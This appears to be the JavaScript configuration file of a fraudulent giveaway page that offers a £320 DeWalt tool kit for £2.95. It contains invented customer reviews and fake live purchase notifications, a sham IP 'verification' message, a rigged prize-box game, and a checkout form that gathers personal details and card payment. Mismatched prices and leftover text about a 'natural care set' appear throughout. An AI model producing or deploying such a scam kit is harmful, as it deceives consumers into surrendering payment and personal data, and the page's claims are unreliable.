const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "FR";
  const lang = "en-US";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: [
      "UK 3", "UK 4", "UK 4.5", "UK 5", "UK 5.5", "UK 6", "UK 6.5",
      "UK 7", "UK 7.5", "UK 8", "UK 8.5", "UK 9", "UK 9.5", "UK 10",
      "UK 10.5", "UK 11", "UK 11.5", "UK 12", "UK 12.5", "UK 13", "UK 13.5",
      "UK 14", "UK 14.5", "UK 15", "UK 16", "UK 17", "UK 18", "UK 19",
    ],
  };

  const mainProduct = {
    header: "Unmissable Offer",
    name: "Dewalt Tools Set",
    oldPrice: "£320",
    newPrice: "£9,99",
    selectText: "",
    text: `
    <div style="padding: 24px; background-color: white; border: 1px solid #D1D5DB; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
      <h2 style="font-size: 24px; font-weight: bold; color: #1F2937; margin-bottom: 16px; line-height:35px;">Tooltstation  invites you to participate in an exclusive offer for craftsmen and DIY enthusiasts!</h2>
      
      <p style="color: #4B5563; line-height: 1.6; margin-bottom: 16px;">
      As part of a special campaign, Tooltstation  is offering you the chance to get a DeWalt Tool Kit (Combo Kit) for just <span style="font-weight: bold; color: #16A34A;">£2.95</span>. And that's not all! You also have a chance to win additional prizes or discounts.
      </p>
  
      <p style="color: #4B5563; line-height: 1.6; margin-bottom: 16px;">
        To take advantage of this tool kit at this symbolic price, simply answer a few simple questions to confirm your participation.
      </p>
      
      <p style="color: #DC2626; font-weight: bold; font-size: 18px; margin-bottom: 16px;">🔨 Hurry! The number of kits is very limited.</p>
    </div>
    `,
  };
  
  
  
  const notifications = [
    {
      user: "Julien Dupont",
      location: "Lyon, France",
      action: "just received a magnificent Tooltstation  natural care set for only £2.95!",
      timeago: "15 seconds ago",
    },
    {
      user: "Camille Lefèvre",
      location: "Marseille, France",
      action: "just received a magnificent Tooltstation  natural care set for only £2.95!",
      timeago: "25 seconds ago",
    },
  ];
  
  

  const reviewsArr = [
    {
      name: "John",
      time: "1 day ago",
      image: "",
      review: "Incredible experience. I don't usually leave reviews, but this time I couldn't resist. I came across this incredible offer and decided to give it a try.",
      header: "Curious",
    },
    {
      name: "Mark",
      time: "2 days ago",
      image: "",
      review: "Has anyone already ordered this DeWalt tool set at this price? Have you received it yet?",
      header: "Impressed",
    },
    {
      name: "Daniel",
      time: "3 days ago",
      image: "./assets/21.jpg",
      review: "Yes! They contacted me the same day. They verified my information and told me delivery would take about 3 days. I can't wait to receive it!\n",
      header: "Satisfied",
    },
    {
      name: "Richard ",
      time: "5 days ago",
      image: "./assets/22.jpg",
      review: `I already received it! The tool kit is superb, but what surprised me the most was the extra gift — a real nice surprise! 🥳 I thought it was too good to be true, but within a few hours they contacted me to confirm my information.
`,
      header: "Incredible moment",
    },
    {
      name: "Nikolas",
      time: "6 days ago",
      image: "",
      review: "Three days later, I received my DeWalt set and I'm thrilled with it. Plus, I was pleasantly surprised by the gift — a nice touch! Don't hesitate to try your luck, maybe fortune will smile on you too! 😊\n",
      header: "Full of hope",
    },
    {
      name: "Arthur",
      time: "6 days ago",
      image: "",
      review: "Wow, what luck! I hope to receive mine very soon too.",
      header: "Impatient",
    },
    {
      name: "August",
      time: "7 days ago",
      image: "",
      review: "I already signed up! Has anyone else received their Dewalt kit yet? 😍 Incredible... I still can't believe it...😍",
      header: "Emotional",
    },
    {
      name: "Kristoffer",
      time: "9 days ago",
      image: "./assets/23.jpg",
      review: "A big thank you. Here's my DeWalt kit! Thank you so much, it's really great!",
      header: "A big thank you",
    },
  ];
  
  

  const reviews = {
    reviews: reviewsArr,
    rr: "REVIEWS AND COMMENTS",
    percent: "99%",
    rec: "recommend this Tooltstation  set",
  };
  
  const questions = {
    _of: "Question {1} of {2}:",
    arr: [
      {
        q: "How often do you use tools for your DIY projects?",
        a: ["EVERY DAY", "EVERY OTHER DAY", "ONCE A WEEK", "ONCE A MONTH", "I DON'T USE ANY"],
      },
      {
        q: "What qualities do you look for in a DeWalt power tool?",
        a: ["POWER AND PERFORMANCE", "ERGONOMICS AND COMFORT", "LONG BATTERY LIFE", "RELIABILITY AND DURABILITY", "I DON'T KNOW"],
      },
      {
        q: "What type of tool is your priority in a combo kit?",
        a: ["DRILL-DRIVER", "CIRCULAR SAW", "HAMMER DRILL", "ANGLE GRINDER", "ALL TYPES"],
      },
      {
        q: "What is your main obstacle in completing your projects?",
        a: ["LACK OF TIME", "LACK OF SKILLS", "LACK OF PROPER TOOLS", "LACK OF SPACE", "I HAVE NO OBSTACLES"],
      },
      {
        q: "What factor is most important to you when purchasing tools?",
        a: ["PRICE", "QUALITY AND DURABILITY", "BRAND (DEWALT)", "EXPERT RECOMMENDATIONS", "ACCESSORY AVAILABILITY"],
      }
    ],
  };
  
  
  

  const check = {
    title: "Your response is being verified.",
    arr: [
      "You have answered question 5/5.",
      "Your IP address shows no previous requests.",
      "Your response has been verified.",
    ],
  };
  
  


  const modals = {
    welcome: {
      texts: {
        header: "Congratulations, you have confirmed that you are a real person ",
        button: "OK",
        text: `
          <center>
          Today, {date}, you have the chance to receive a high-performance DeWalt Combo Kit offered by Tooltstation .
          <br><br>
          All you have to do is choose the right toolbox.
          <br><br>
          You have 3 attempts, good luck!
          </center>
        `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
          <center>
          Too bad! This box is empty. You have 2 attempts left, good luck!
          </center>
        `,
      },
    },
    win: {
      texts: {
        header: "Congratulations! You won!",
        button: "OK",
        text: `
          <center>
            <p style="color: #000">
            Congratulations! You won! Congratulations! You won a high-performance DeWalt Combo Kit with a professional transport bag in a modern design, perfect for all your job sites.
            </p>
            <br>
            1) Click "OK" to access the delivery page.
            <br><br>
            2) Fill out the form and make the payment to receive your kit.
            <br><br>
            3) Your kit will be delivered within 3 to 5 business days.
          </center>
        `,
      },
    },
  };
  
  


  const cartSteps = {
    personal: {
      title: "Personal Information",
      fields: {
        name: {
          field: "First Name",
        },
        family: {
          field: "Last Name",
        },
        phone: {
          field: "Phone Number",
        },
        email: {
          field: "Email Address",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          field: "City",
        },
        address: {
          field: "Delivery Address",
        },
        zip: {
          field: "Postal Code",
        },
      },
    },
    payment: {
      title: "Payment Method",
      creditCard: "Online payment by credit card",
    },
  };
  
  
  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Summary",
      oldPrice: "£320",
      newPrice: "£2.95",
      size: "Capacity",
      subTotal: {
        title: "Order Value",
        amount: "£2.95",
      },
      delivery: {
        title: "Delivery",
        amount: "£0.00",
      },
      total: {
        title: "Total",
        amount: "£2.95",
      },
      checkoutButton: "Proceed to Secure Payment",
    },
  };
  
  
  

  const products = [
    {
      id: "26468782",
      name: "",
      miniImg: "./assets/prod1.jpg",
      images: [
        "./assets/prod1.jpg",
      ],
    },
  ];

  const footer = {
    cr: "© 2025 Tooltstation . All rights reserved.",
  };
  
  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/prod1.jpg",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);


window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};